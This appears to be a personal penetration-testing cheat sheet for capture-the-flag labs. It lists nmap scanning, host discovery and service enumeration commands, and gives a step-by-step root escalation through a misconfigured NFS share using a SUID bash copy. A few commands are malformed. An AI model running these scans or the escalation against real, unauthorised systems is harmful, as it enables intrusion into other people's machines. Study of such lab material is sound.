
### ~={green}Basic command=~
``` bash
sudo nmap 10.10.11.14
```

### ~={green}Aggressive scan / Extensive scan=~
``` bash
sudo nmap -T4 -A -v 10.10.11.14
```

### ~={green}Smb enum scan=~
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.95.77
```
###  ~={green}Scan all port=~
```c
sudo nmap -p- --min-rate=10000 -oG broker-allport 10.10.11.243
```

```bash
nmap -A -p- -T4 10.129.131.95
```

```
sudo nmap -sC -sV -A -oA solarlab 10.129.60.6 -v
```

### ~={green}Enumerate the directories=~
```
sudo nmap -sV --script=http-enum 10.10.11.243
```

### ~={green}Discover the hostnames that resolve the targeted domain=~
```
sudo nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- 10.10.11.243
```

### ~={green}Perform an HTTP trace on the targeted domain=~
```
sudo nmap -p80 --script http-waf-detect 10.10.11.243
```

### ~={green}Host Discovery using ARP=~
```
sudo  nmap -PR -sn 192.168.0.0/24 10.10.11.243
```

### ~={green}Host Discovery using ICMP=~
```
sudo  nmap -PE -sn 192.168.0.0/24
```

```
sudo  nmap -PP -sn 192.168.0.0/24
```

```
sudo  nmap -PM -sn 192.168.0.0/24
```

### ~={green}Host Discovery using TCP and UDP=~
```
sudo nmap -PS -sn 192.168.0.0/24      # TCP SYN
```

```
sudo nmap -PA -sn 192.168.0.0/24      # TCP ACK
```

```
sudo nmap -PU -sn 192.168.0.0/24      # UDP
```

### ~={green} Command to get only ports number=~
```
┌──(voldemort@ideapad)-[~/thm]
└─$ nmap 10.17.104.140 -p- | grep "^[0-9]" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'

80,111,2049,8834,17500,40349,44879,48467,50031,52047,57621,59277
```

### ~={green}Identify all active hosts in a network=~
```bash
nmap -sP <target_IP>/Subnet
```

### ~={green}Do a Stelth Scan, Invading firewall, IDS/IPS=~
```bash
nmap -sS -p 80, 443 <target_IP>/Subnet
```

### ~={green}Identify the OS of the machine hosting a DB=~
```bash
nmap -p3306,1433 IP/subnet
```

### ~={green}Locate IP address of the machine with RDP open port=~
```bash
nmap -Pn -p -sV 3389 <target_IP>
```

### ~={green}Find FQDN of domain controller=~

FQDN (**FQDN = Hostname + Domain**) an example can be: mail.example.com mail (hostname), example.com (domain).

Scan subnet or target filtering for LDAP port (389):

* `nmap -p389 -sV -iL <target_list>` -> if we've more targets IP

or

* `nmap -p389 -sV <target_IP>`

or

* `nmap -p 389 --script ldap-rootdse <target_IP>`

If LDAP port is filtered or closed, we should try to scan host using following parameters:

* `nmap -Pn -A <target_IP>`

In alternative we can find following ports opened: 88 (Kerberos), 636 (LDAPS), 3268 (LDAP Global).

Running nmap command we'll retrieve info about Domain and Host name:

* Domain: pentester.team Service Info: Host: DC;
* then FQDN = DC.pentester.team

### ~={green}Identify the number of hosts that are alive=~

to checks hosts up: 
```bash 
nmap -sn IP/Subnet
```

### ~={green}Identify potential vulnerabilities of services=~

```bash 
 nmap -Pn --script vuln <target_IP>
```

### ~={green}Perform vertical privilege escalation of a root user, and enter the flag=~

Exploiting misconfigured NFS (port 2049)

* `nmap -sV —p 2049 IP/Subnet`
* `sudo apt-get install nfs-common`
* `nmap -sV —script=nfs-showmount <Target_IP>`
* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
* `mkdir /tmp/nfs`
* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`&#x20;
* `cd /tmp/nfs`
* `sudo cp /bin/bash .`
* `sudo chmod +s bash` -> it will be highlighted in red
* `ls -la`
* `sudo df -h`
* `sudo chmod +s bash`&#x20;

after them, In another terminal:

* Access to target using SSH
* `./bash -p` and we're root!
* `cd /home`
* `ls -la`
* Find the flag: `find / -name "*.txt" -ls 2> /dev/null`

### ~={green} Promiscuous Detection Tools=~ 
*Keywords: Wireshark, Detect, sniffer
```bash
nmap --script=sniffer-detect {target ip/ range of ip}
```